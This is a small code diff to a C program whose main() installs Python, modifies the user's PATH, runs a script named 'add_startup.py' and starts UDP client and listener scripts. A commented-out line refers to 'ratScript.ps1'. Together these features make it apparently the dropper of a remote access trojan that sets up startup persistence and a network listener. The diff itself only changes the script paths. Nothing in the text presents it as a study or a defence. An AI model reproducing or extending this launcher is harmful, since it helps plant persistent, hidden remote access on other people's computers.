@@ -8,8 +8,8 @@ int main()
     system("start /WAIT python-3.8.1.exe");
     system("setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
     system("python add_startup.py");
-    system("python ./UDP_Connection/client.py\n");
-    system("python ./UDP_Connection/clientlistener.py\n");
+    system("python ../UDP_Connection/client.py\n");
+    system("python ../UDP_Connection/clientlistener.py\n");
     //system("%homepath%\\documents\\ourFolder\\ratScript.ps1");
     return 0;
 }
